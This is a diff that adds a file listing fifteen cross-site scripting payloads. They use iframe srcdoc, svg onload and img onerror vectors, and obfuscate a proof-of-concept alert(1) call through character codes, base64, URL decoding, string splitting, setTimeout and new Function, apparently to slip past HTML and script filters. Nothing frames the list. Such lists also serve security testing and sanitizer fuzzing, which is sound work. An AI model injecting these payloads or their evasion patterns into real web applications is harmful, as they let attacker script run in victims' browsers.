@@ -1,0 +1,15 @@
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>"></iframe>
+<svg onload="window['al'+'ert'](1)">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload="setTimeout('al'+'ert(1)',0)">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
+<svg onload="new Function('al'+'ert(1)')()">
+<svg onload="window[unescape('%61%6c%65%72%74')](1)">
+<iframe srcdoc="<svg onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))></svg>"></iframe>
+<svg onload="setTimeout(unescape('%61%6c%65%72%74(1)'),0)">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"></iframe>
+<svg onload="new Function(unescape('%61%6c%65%72%74(1)'))()">
+<svg onload="window[decodeURIComponent('%61%6c%65%72%74')](1)">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload="setTimeout(decodeURIComponent('%61%6c%65%72%74(1)'),0)">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"></iframe>
